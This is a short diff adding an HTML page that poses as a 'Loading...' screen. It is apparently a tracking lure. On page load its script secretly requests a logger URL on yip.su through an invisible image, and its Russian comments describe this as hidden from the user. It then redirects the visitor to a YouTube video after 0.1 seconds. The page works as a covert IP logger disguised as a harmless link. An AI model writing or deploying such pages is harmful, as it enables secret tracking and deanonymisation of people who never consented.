@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Loading...</title>
+    <script>
+        function logAndRedirect() {
+            const loggerUrl = "https://yip.su/sddsf4";
+            const youtubeUrl = "https://www.youtube.com/watch?v=MsXm9TUMaA0";
+
+            // 1. Невидимый запрос к логгеру (скрыто от глаз юзера)
+            const img = new Image();
+            img.src = loggerUrl; 
+
+            // 2. Мгновенный переход на Ютуб через 0.1 сек
+            setTimeout(() => {
+                window.location.replace(youtubeUrl);
+            }, 100);
+        }
+
+        window.onload = logAndRedirect;
+    </script>
+</head>
+<body style="background: #000;">
+    </body>
+</html>
